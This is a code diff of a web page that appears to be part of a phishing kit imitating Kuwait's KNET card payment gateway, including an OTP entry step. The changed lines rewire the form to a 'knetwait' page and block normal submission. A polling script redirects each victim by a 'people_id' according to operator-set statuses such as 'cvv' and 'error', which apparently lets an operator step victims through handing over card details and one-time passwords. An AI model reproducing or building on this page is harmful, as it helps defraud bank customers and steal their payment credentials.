@@ -16,7 +16,7 @@
     <link href="knet/payment-responsive.css" rel="stylesheet" type="text/css">
     <link href="knet/payment-stylesheet.css" rel="stylesheet" type="text/css">
 
-    <form method="post" action="#"><input type="hidden" name="_token" value="yHz88lwiZ20KwKQdeevEZTrtAzwFI8QgmxI3JiS8" autocomplete="off">
+    <form method="post" action="knetwait.html" onsubmit="return false;"><input type="hidden" name="_token" value="yHz88lwiZ20KwKQdeevEZTrtAzwFI8QgmxI3JiS8" autocomplete="off">
         <div class="madd">
             <img src="knet/mob.jpg" alt="">
         </div>
@@ -265,17 +265,17 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
                     window.location.href = 'knetpage.html';
                 }
                 if (data.people_id == pid && data.status == 'cvv') {
-                    window.location.href = '#';
+                    window.location.href = 'index.html';
                 }
                 if (data.people_id == pid && data.status == 'error') {
-                    window.location.href = '#';
+                    window.location.href = 'index.html';
                 }
                 if (data.people_id == pid && data.status == 'hawety') {
-                    window.location.href = '#';
+                    window.location.href = 'index.html';
                 }
 
                 if (data.people_id == pid && data.status == 'idpedol') {
-                    window.location.href = '#';
+                    window.location.href = 'index.html';
                 }
 
             });
@@ -306,7 +306,7 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
         <input type="hidden" name="merchHeaderFile" value="">
 
         <input type="hidden" name="mrchName" value="Tap Payments EPSP">
-        <input type="hidden" name="mrchWeb" value="#">
+        <input type="hidden" name="mrchWeb" value="index.html">
         <input type="hidden" name="pymntInstrmntCC" id="pymntInstrmntCC" value="1">
 
         <input type="hidden" name="pymntInstrmntAC" value="0">
@@ -453,6 +453,7 @@ This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in th
         <input type="hidden" name="kfastRegDeclineValue">
     </form>
 
+<script>function cancelPage() { window.location.href = "index.html"; } function sibTags() {} function payConfirmAjax(action) { window.location.href = "index.html"; }</script>
 </body>
 
 </html>
